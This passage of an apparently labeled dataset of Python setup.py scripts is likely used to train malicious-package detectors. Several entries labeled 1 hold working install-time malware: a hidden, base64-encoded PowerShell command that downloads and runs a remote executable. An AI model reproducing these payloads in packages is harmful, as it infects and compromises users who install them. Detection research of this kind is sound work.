2.7',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Cython'\n]\n\nURL = 'http://github.com/wesm/feather'\n\nsetup(\n    name=\"feather-format\",\n    packages=['feather'],\n    version=VERSION,\n    package_data={'feather': ['*.pxd', '*.pyx']},\n    install_requires=['pyarrow>=0.4.0'],\n    description=DESCRIPTION,\n    long_description=LONG_DESCRIPTION,\n    long_description_content_type='text/markdown',\n    license='Apache License, Version 2.0',\n    classifiers=CLASSIFIERS,\n    author=\"Wes McKinney\",\n    author_email=\"wesm@apache.org\",\n    url=URL\n)\n", "target": 0}
{"idx": "entrypoint2-1.1", "func": "import os\n\nfrom setuptools import setup\n\nNAME = \"entrypoint2\"\n\n# get __version__\n__version__ = None\nexec(open(os.path.join(NAME, \"about.py\")).read())\nVERSION = __version__\n\nURL = \"https://github.com/ponty/entrypoint2\"\nDESCRIPTION = \"easy to use command-line interface for python modules\"\nLONG_DESCRIPTION = \"\"\"easy to use command-line interface for Python modules\n\nhome: https://github.com/ponty/entrypoint2/tree/\"\"\"\nLONG_DESCRIPTION += VERSION\n\nPACKAGES = [\n    NAME,\n    NAME + \".examples\",\n    NAME + \".check\",\n]\n\nclassifiers = [\n    # Get more strings from\n    # http://pypi.python.org/pypi?%3Aaction=list_classifiers\n    \"License :: OSI Approved :: BSD License\",\n    \"Natural Language :: English\",\n    \"Operating System :: OS Independent\",\n    \"Programming Language :: Python\",\n    \"Programming Language :: Python :: 3\",\n    \"Programming Language :: Python :: 3 :: Only\",\n    \"Programming Language :: Python :: 3.6\",\n    \"Programming Language :: Python :: 3.7\",\n    \"Programming Language :: Python :: 3.8\",\n    \"Programming Language :: Python :: 3.9\",\n    \"Programming Language :: Python :: 3.10\",\n    \"Programming Language :: Python :: 3.11\",\n]\n\ninstall_requires = []\n\n# compatible with distutils of python 2.3+ or later\nsetup(\n    name=NAME,\n    version=VERSION,\n    description=DESCRIPTION,\n    long_description=LONG_DESCRIPTION,\n    long_description_content_type=\"text/x-rst\",\n    classifiers=classifiers,\n    keywords=\"argparse decorator optparse signature command-line\",\n    author=\"ponty\",\n    # author_email='',\n    url=URL,\n    license=\"BSD\",\n    packages=PACKAGES,\n    install_requires=install_requires,\n    package_data={\n        NAME: [\"py.typed\"],\n    },\n)\n", "target": 0}
{"idx": "selfgrandkillhacked-2.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgrandkillhacked',\n    packages = ['modlib'],\n    version = '7.3',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-fixme-1.1.1", "func": "# coding: utf-8\n\nfrom __future__ import with_statement\n\nfrom setuptools import setup\n\nfrom flake8_fixme.metadata import CODE_STEM, NAME, VERSION\n\n\ndef get_readme() -> str:\n    with open(\"README.md\") as readme_handle:\n        return readme_handle.read()\n\n\nsetup(\n    name=NAME,\n    version=VERSION,\n    description=\"Check for FIXME, TODO and other temporary developer notes. Plugin for flake8.\",  # noqa: T\n    long_description=get_readme(),\n    long_description_content_type=\"text/markdown\",\n    keywords=\"flake8 plugin fixme todo xxx hack\",\n    author=\"Tom Milligan\",\n    author_email=\"tommilligan@users.noreply.github.com\",\n    url=\"https://github.com/tommilligan/flake8-fixme\",\n    license=\"Apache-2.0\",\n    packages=[\"flake8_fixme\"],\n    install_requires=[],\n    zip_safe=False,\n    entry_points={\"flake8.extension\": [\"{} = flake8_fixme:check\".format(CODE_STEM)]},\n    classifiers=[\n        \"Framework :: Flake8\",\n        \"Intended Audience :: Developers\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Operating System :: OS Independent\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Topic :: Software Development :: Quality Assurance\",\n    ],\n)\n", "target": 0}
{"idx": "django-bulk-update-2.2.0", "func": "import os\nimport sys\nfrom setuptools import setup, find_packages\n\nREADME = open(os.path.join(os.path.dirname(__file__), 'README.md')).read()\n\n# allow setup.py to be run from any path\nos.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir)))\n\nversion = \"2.2.0\"\n\nif sys.argv[-1] == 'publish':\n    os.system('python setup.py sdist upload')\n    os.system('python setup.py bdist_wheel upload')\n    sys.exit()\n\nif sys.argv[-1] == 'tag':\n    os.system(\"git tag -a %s -m 'version %s'\" % (version, version))\n    os.system(\"git push --tags\")\n    sys.exit()\n\nsetup(\n    name='django-bulk-update',\n    version=version,\n    packages=find_packages(),\n    include_package_data=True,\n    install_requires=[\n        'Django>=1.8',\n    ],\n    description='Bulk update using one query over Django ORM.',\n    long_description=README,\n    url='https://github.com/aykut/django-bulk-update',\n    author='Aykut Ozat',\n    author_email='aykutozat@gmail.com',\n    zip_safe=False,\n    classifiers=[\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    ],\n)\n", "target": 0}
{"idx": "esqrandompullmine-6.45", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrandompullmine',\n    packages = ['modlib'],\n    version = '10.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqpeppost-9.54", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpeppost',\n    packages = ['modlib'],\n    version = '3.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dartsclone-0.10.2", "func": "from setuptools import setup, Extension\n\nNAME = 'dartsclone'\nVERSION = '0.10.2'\nEXTENSIONS = [\n    Extension(\n        '{0}._{0}'.format(NAME),\n        language='c++',\n        sources=[\n            '{0}/_{0}.pyx'.format(NAME),\n            'csrc/src/darts.cc'\n        ],\n        include_dirs=['./csrc/include']\n    )\n]\n\nif __name__ == '__main__':\n    import os\n    from os import path\n    import glob\n\n    [os.remove(f) for f in glob.glob('%s/*cpp' % NAME)]\n\n    with open(path.join(path.dirname(__file__), 'README.md'), encoding='utf-8') as f:\n        readme = f.read()\n\n    setup(\n        packages=[NAME],\n        name=NAME,\n        version=VERSION,\n        description='Python binding of Darts Clone',\n        author='@rixwew',\n        author_email='rixwew@gmail.com',\n        url='https://github.com/rixwew/darts-clone-python',\n        setup_requires=[\n            'cython>=0.28',\n        ],\n        ext_modules=EXTENSIONS,\n        zip_safe=False,\n        long_description=readme,\n        long_description_content_type='text/markdown',\n        classifiers=[\n            'License :: OSI Approved :: Apache Software License',\n            'Programming Language :: Cython',\n            'Programming Language :: Python :: 2',\n            'Programming Language :: Python :: 3',\n            'Topic :: Text Processing :: Linguistic'\n        ],\n        install_requires=['Cython']\n    )\n\n", "target": 0}
{"idx": "genbadge-1.1.0", "func": "\"\"\"\nTo understand this project's build structure\n\n - This project uses setuptools, so it is declared as the build system in the pyproject.toml file\n - We use as much as possible `setup.cfg` to store the information so that it can be read by other tools such as `tox`\n   and `nox`. So `setup.py` contains **almost nothing** (see below)\n   This philosophy was found after trying all other possible combinations in other projects :)\n   A reference project that was inspiring to make this move : https://github.com/Kinto/kinto/blob/master/setup.cfg\n\nSee also:\n  https://setuptools.readthedocs.io/en/latest/setuptools.html#configuring-setup-using-setup-cfg-files\n  https://packaging.python.org/en/latest/distributing.html\n  https://github.com/pypa/sampleproject\n\"\"\"\nfrom setuptools import setup\nimport pkg_resources\n\n\n# (1) check required versions (from https://medium.com/@daveshawley/safely-using-setup-cfg-for-metadata-1babbe54c108)\npkg_resources.require(\"setuptools>=39.2\")\npkg_resources.require(\"setuptools_scm\")\n\n# (2) read the setup.cfg to grab useful metadata\nfrom setuptools.config import read_configuration\nconf_dict = read_configuration(\"setup.cfg\")\nPKG_NAME = conf_dict['metadata']['name']\nURL = conf_dict['metadata']['url']\n\n# (3) Generate download url using git version\nfrom setuptools_scm import get_version  # noqa: E402\nDOWNLOAD_URL = URL + \"/tarball/\" + get_version()\n\n\n# (4) Call setup() with as little args as possible\nsetup(\n    download_url=DOWNLOAD_URL,\n    use_scm_version={\n        \"write_to\": \"%s/_version.py\" % PKG_NAME\n    },  # we can't put `use_scm_version` in setup.cfg yet unfortunately\n)\n", "target": 0}
{"idx": "grpcio-testing-1.47.0", "func": "# Copyright 2017 gRPC authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Setup module for gRPC Python's testing package.\"\"\"\n\nimport os\nimport sys\n\nimport setuptools\n\n_PACKAGE_PATH = os.path.realpath(os.path.dirname(__file__))\n_README_PATH = os.path.join(_PACKAGE_PATH, 'README.rst')\n\n# Ensure we're in the proper directory whether or not we're being used by pip.\nos.chdir(os.path.dirname(os.path.abspath(__file__)))\n\n# Break import style to ensure that we can find same-directory modules.\nimport grpc_version\n\n\nclass _NoOpCommand(setuptools.Command):\n    \"\"\"No-op command.\"\"\"\n\n    description = ''\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        pass\n\n\nPACKAGE_DIRECTORIES = {\n    '': '.',\n}\n\nINSTALL_REQUIRES = (\n    'protobuf>=3.12.0',\n    'grpcio>={version}'.format(version=grpc_version.VERSION),\n)\n\ntry:\n    import testing_commands as _testing_commands\n\n    # we are in the build environment, otherwise the above import fails\n    COMMAND_CLASS = {\n        # Run preprocess from the repository *before* doing any packaging!\n        'preprocess': _testing_commands.Preprocess,\n    }\nexcept ImportError:\n    COMMAND_CLASS = {\n        # wire up commands to no-op not to break the external dependencies\n        'preprocess': _NoOpCommand,\n    }\n\nsetuptools.setup(name='grpcio-testing',\n                 version=grpc_version.VERSION,\n                 license='Apache License 2.0',\n                 description='Testing utilities for gRPC Python',\n                 long_description=open(_README_PATH, 'r').read(),\n                 author='The gRPC Authors',\n                 author_email='grpc-io@googlegroups.com',\n                 url='https://grpc.io',\n                 package_dir=PACKAGE_DIRECTORIES,\n                 packages=setuptools.find_packages('.'),\n                 install_requires=INSTALL_REQUIRES,\n                 cmdclass=COMMAND_CLASS)\n", "target": 0}
{"idx": "postgame-7.37", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'postgame',\n    packages = ['modlib'],\n    version = '2.82',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "cpucpu-6.78", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'cpucpu',\n    packages = ['modlib'],\n    version = '6.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "grpc-google-iam-v1-0.12.4", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\nname = \"grpc-google-iam-v1\"\ndescription = \"IAM API client library\"\nversion = \"0.12.4\"\nurl = \"https://github.com/googleapis/python-grpc-google-iam-v1\"\nrelease_status = \"Development Status :: 4 - Beta\"\ndependencies = [\n    \"grpcio>=1.0.0, <2.0.0dev\",\n    \"googleapis-common-protos[grpc]>=1.56.0, <2.0.0dev\",\n]\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.iam\" in packages:\n    namespaces.append(\"google.iam\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=url,\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    python_requires=\">=3.6\",\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "ReverseShell-0.1.0", "func": "from setuptools import setup\nfrom glob import glob\n\nsetup(\n    name=\"ReverseShell\",\n    version=\"0.1.0\",\n    py_modules=[\"ReverseShell\"],\n    install_requires=[\"PythonToolsKit\"],\n    author=\"Maurice Lambert\",\n    author_email=\"mauricelambert434@gmail.com\",\n    maintainer=\"Maurice Lambert\",\n    maintainer_email=\"mauricelambert434@gmail.com\",\n    description=(\n        \"This package implements an advanced reverse \"\n        \"shell console (supports: TCP, UDP, IRC, HTTP and DNS).\"\n    ),\n    long_description=open(\"README.md\").read(),\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/mauricelambert/ReverseShell\",\n    project_urls={\n        \"Documentation\": \"https://mauricelambert.github.io/info/python/security/ReverseShell.html\",\n        \"Executable\": \"https://mauricelambert.github.io/info/python/security/ReverseShell.pyz\",\n    },\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python\",\n        \"Topic :: System :: Networking\",\n        \"Natural Language :: English\",\n        \"Operating System :: MacOS\",\n        \"Topic :: Security\",\n    ],\n    scripts=glob(\"clients/*.py\"),\n    python_requires=\">=3.8\",\n    entry_points={\n        \"console_scripts\": [\"ReverseShell = ReverseShell:main\"],\n    },\n    keywords=[\n        \"ReverseShell\",\n        \"terminal\",\n        \"console\",\n        \"netcat\",\n        \"HTTP\",\n        \"IRC\",\n        \"DNS\",\n        \"TCP\",\n        \"UDP\",\n    ],\n    platforms=[\"Windows\", \"Linux\", \"MacOS\"],\n    license=\"GPL-3.0 License\",\n)\n", "target": 1}
{"idx": "Flask-Bcrypt-1.0.1", "func": "import os\n\nfrom setuptools import setup\n\nthis_directory = os.path.dirname(__file__)\nmodule_path = os.path.join(this_directory, 'flask_bcrypt.py')\nversion_line = [line for line in open(module_path)\n                if line.startswith('__version_info__')][0]\nwith open(os.path.join(this_directory, 'README.markdown')) as f:\n    long_description = f.read()\n\n__version__ = '.'.join(eval(version_line.split('__version_info__ = ')[-1]))\n\nsetup(\n    name='Flask-Bcrypt',\n    version=__version__,\n    url='https://github.com/maxcountryman/flask-bcrypt',\n    license='BSD',\n    author='Max Countryman',\n    author_email='maxc@me.com',\n    description='Brcrypt hashing for Flask.',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    py_modules=['flask_bcrypt'],\n    zip_safe=False,\n    platforms='any',\n    install_requires=['Flask', 'bcrypt>=3.1.1'],\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ],\n    test_suite='test_bcrypt'\n)\n", "target": 0}
{"idx": "deap-1.3.3", "func": "#!/usr/bin/env python\nimport sys\n\nwarnings = list()\n\ntry:\n    from setuptools import setup, Extension, find_packages\n    modules = find_packages(exclude=['examples'])\nexcept ImportError:\n    warnings.append(\"warning: using distutils.core.setup, cannot use \\\"develop\\\" option\")\n    from distutils.core import setup, Extension\n    modules = ['deap', 'deap.benchmarks', 'deap.tests', 'deap.tools', 'deap.tools._hypervolume']\n\nfrom setuptools.command.build_ext import build_ext\nfrom distutils.errors import CCompilerError, DistutilsExecError, \\\n    DistutilsPlatformError\n\n# read the contents of README file\nfrom os import path\nimport codecs\nthis_directory = path.abspath(path.dirname(__file__))\nlong_description = codecs.open(path.join(this_directory, 'README.md'), 'r', 'utf-8').read()\n\nimport deap\n\nif sys.platform == 'win32' and sys.version_info > (2, 6):\n   # 2.6's distutils.msvc9compiler can raise an IOError when failing to\n   # find the compiler\n   # It can also raise ValueError http://bugs.python.org/issue7511\n   ext_errors = (CCompilerError, DistutilsExecError, DistutilsPlatformError,\n                 IOError, ValueError)\nelse:\n   ext_errors = (CCompilerError, DistutilsExecError, DistutilsPlatformError)\n\nclass BuildFailed(Exception):\n    pass\n\nclass ve_build_ext(build_ext):\n    # This class allows C extension building to fail.\n\n    def run(self):\n        try:\n            build_ext.run(self)\n        except DistutilsPlatformError as e:\n            print(e)\n            raise BuildFailed()\n\n    def build_extension(self, ext):\n        try:\n            build_ext.build_extension(self, ext)\n        except ext_errors as e:\n            print(e)\n            raise BuildFailed()\n\ndef run_setup(build_ext):\n    extra_modules = None\n    if build_ext:\n        extra_modules = list()\n\n        hv_module = Extension(\"deap.tools._hypervolume.hv\", sources=[\"deap/tools/_hypervolume/_hv.c\", \"deap/tools/_hypervolume/hv.cpp\"])\n        extra_modules.append(hv_module)\n\n    setup(name='deap',\n          version=deap.__revision__,\n          description='Distributed Evolutionary Algorithms in Python',\n          long_description=long_description,\n          long_description_content_type=\"text/markdown\",\n          author='deap Development Team',\n          author_email='deap-users@googlegroups.com',\n          url='https://www.github.com/deap',\n          packages=find_packages(exclude=['examples']),\n        #   packages=['deap', 'deap.tools', 'deap.tools._hypervolume', 'deap.benchmarks', 'deap.tests'],\n          platforms=['any'],\n          keywords=['evolutionary algorithms', 'genetic algorithms', 'genetic programming', 'cma-es', 'ga', 'gp', 'es', 'pso'],\n          license='LGPL',\n          classifiers=[\n            'Development Status :: 4 - Beta',\n            'Intended Audience :: Developers',\n            'Intended Audience :: Education',\n            'Intended Audience :: Science/Research',\n            'License :: OSI Approved :: GNU Library or Lesser General Public License (LGPL)',\n            'Programming Language :: Python',\n            'Programming Language :: Python :: 3',\n            'Topic :: Scientific/Engineering',\n            'Topic :: Software Development',\n            ],\n         ext_modules=extra_modules,\n         cmdclass={\"build_ext\": ve_build_ext},\n         install_requires=['numpy'],\n    )\n\ntry:\n    run_setup(True)\nexcept BuildFailed:\n    print(\"*\" * 75)\n    print(\"WARNING: The C extensions could not be compiled, \"\n          \"speedups won't be available.\")\n    print(\"Now building without C extensions.\")\n    print(\"*\" * 75)\n\n    run_setup(False)\n\n    print(\"*\" * 75)\n    print(\"WARNING: The C extensions could not be compiled, \"\n          \"speedups won't be available.\")\n    print(\"Plain-Python installation succeeded.\")\n    print(\"*\" * 75)\n\nprint(\"\\n\".join(warnings))\n", "target": 0}
